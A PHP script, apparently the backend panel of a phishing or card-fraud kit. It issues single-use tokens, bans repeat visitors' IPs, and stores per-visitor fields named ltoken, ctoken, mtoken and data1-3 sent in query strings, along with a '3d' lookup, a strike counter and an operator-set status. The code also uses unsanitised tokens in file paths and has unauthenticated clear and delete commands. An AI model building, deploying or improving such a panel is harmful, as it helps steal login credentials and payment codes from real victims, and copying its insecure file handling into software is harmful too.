<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET");
header("Access-Control-Allow-Headers: Content-Type");

function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function isIPBlacklisted($ip) {
    $blacklist = file('blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, $blacklist);
}

function isIPInList($ip) {
    $ipsList = file('ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, $ipsList);
}

function addIPToList($ip) {
    file_put_contents('ips.txt', $ip . PHP_EOL, FILE_APPEND);
}

function addIPToBlacklist($ip) {
    file_put_contents('blacklist.txt', $ip . PHP_EOL, FILE_APPEND);
}

function readdIP($ip) {
    $ipsList = file('ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $ipsList)) {
        return true;
    } else {
        file_put_contents('ips.txt', $ip . PHP_EOL, FILE_APPEND);
        return false;
    }
}

function isTokenActive($token) {
    $activeTokens = file('active.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($token, $activeTokens);
}

function moveTokenToInactive($token) {
    $activeTokens = file('active.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $newActiveTokens = array_diff($activeTokens, [$token]);
    file_put_contents('active.txt', implode(PHP_EOL, $newActiveTokens) . PHP_EOL);
    file_put_contents('inactive.txt', $token . PHP_EOL, FILE_APPEND);
}

function createTokenJsonFile($token, $ip, $userAgent, $referer) {
    $userData = [
        "token" => $token,
        "ip" => $ip,
        "referer" => $referer,
        "strikes" => "0",
        "status" => "inicio",
        "ltoken" => "unreceived",
        "ctoken" => "unreceived",
        "mtoken" => "unreceived",
        "data1" => "unreceived",
        "data2" => "unreceived",
        "data3" => "unreceived",
        "userAgent" => $userAgent,
    ];

    $filename = __DIR__ . "/users/{$token}.json";
    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $userData = json_decode($jsonContent, true);
    }

    if (isset($_GET['ltoken'])) {
        $userData['ltoken'] = $_GET['ltoken'];
    }
    if (isset($_GET['ctoken'])) {
        $userData['ctoken'] = $_GET['ctoken'];
    }
    if (isset($_GET['mtoken'])) {
        $userData['mtoken'] = $_GET['mtoken'];
    }
    if (isset($_GET['data1'])) {
        $userData['data1'] = $_GET['data1'];
    }
    if (isset($_GET['data2'])) {
        $userData['data2'] = $_GET['data2'];
    }
    if (isset($_GET['data3'])) {
        $userData['data3'] = $_GET['data3'];
    }

    $jsonContent = json_encode($userData, JSON_PRETTY_PRINT);
    file_put_contents($filename, $jsonContent);
}

function clearFiles() {
    $files = ['ips.txt', 'blacklist.txt', 'active.txt', 'inactive.txt'];

    foreach ($files as $file) {
        if (file_exists($file)) {
            file_put_contents($file, '');
        } else {
            touch($file);
        }
    }
}

function deleteTokenFile($token) {
    $filename = __DIR__ . "/users/{$token}.json";
    if (file_exists($filename)) {
        unlink($filename);
        return true;
    } else {
        return false;
    }
}

if (isset($_GET['token'])) {
    $token = $_GET['token'];
    $ip = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

    $response = [];

    if (readdIP($ip)) {
        $response['readded'] = 'yes';
        $response['ban'] = 'no';
        $response['token'] = 'readded';
    } else {
        $response['readded'] = 'no';

        if (isIPBlacklisted($ip)) {
            $response['ban'] = 'yes';
            $response['token'] = 'readded';
        } else {
            $response['ban'] = 'no';

            if (isTokenActive($token)) {
                $response['token'] = '200ok';
                moveTokenToInactive($token);
                createTokenJsonFile($token, $ip, $userAgent, $referer);
            } else {
                $response['token'] = 'denied';
            }
        }
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['ip'])) {
    $ip = getClientIP();
    $response = [];

    if (isIPInList($ip)) {
        $response['readded'] = 'yes';
    } else {
        $response['readded'] = 'no';
    }

    if (isIPBlacklisted($ip)) {
        $response['ban'] = 'yes';
    } else {
        $response['ban'] = 'no';
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['addb'])) {
    $ip = getClientIP();
    addIPToBlacklist($ip);
    $response = ['status' => '200ok'];

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['clear'])) {
    clearFiles();
    $response = ['status' => 'files cleared'];

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['status'])) {
    $response = ['status' => '200 ok'];

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['user'])) {
    $token = $_GET['user'];
    $filename = __DIR__ . "/users/{$token}.json";

    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $data = json_decode($jsonContent, true);

        if (isset($_GET['status'])) {
            $data['status'] = $_GET['status'];
        }
        if (isset($_GET['ltoken'])) {
            $data['ltoken'] = $_GET['ltoken'];
        }
        if (isset($_GET['ctoken'])) {
            $data['ctoken'] = $_GET['ctoken'];
        }
        if (isset($_GET['mtoken'])) {
            $data['mtoken'] = $_GET['mtoken'];
        }
        if (isset($_GET['data1'])) {
            $data['data1'] = $_GET['data1'];
        }
        if (isset($_GET['data2'])) {
            $data['data2'] = $_GET['data2'];
        }
        if (isset($_GET['data3'])) {
            $data['data3'] = $_GET['data3'];
        }
        if (isset($_GET['par1'])) {
            $data['par1'] = $_GET['par1'];
        }
        if (isset($_GET['par2'])) {
            $data['par2'] = $_GET['par2'];
        }
        if (isset($_GET['par3'])) {
            $data['par3'] = $_GET['par3'];
        }

        $jsonContent = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $jsonContent);

        $response = ['status' => '200 ok'];
    } else {
        $response = ['status' => 'user not found'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['3d'])) {
    $token = $_GET['3d'];
    $filename = __DIR__ . "/users/{$token}.json";

    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $response = json_decode($jsonContent, true);
    } else {
        $response = ['status' => 'token not found'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['clr'])) {
    $token = $_GET['clr'];
    if (deleteTokenFile($token)) {
        $response = ['status' => 'file deleted'];
    } else {
        $response = ['status' => 'file not found'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['strk'])) {
    $token = $_GET['strk'];
    $filename = __DIR__ . "/users/{$token}.json";

    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $data = json_decode($jsonContent, true);

        if (isset($data['strikes'])) {
            $data['strikes'] = (string)(((int)$data['strikes']) + 1);
        } else {
            $data['strikes'] = "1";
        }

        $jsonContent = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $jsonContent);

        $response = ['status' => 'strikes incremented'];
    } else {
        $response = ['status' => 'token not found'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
}
?>

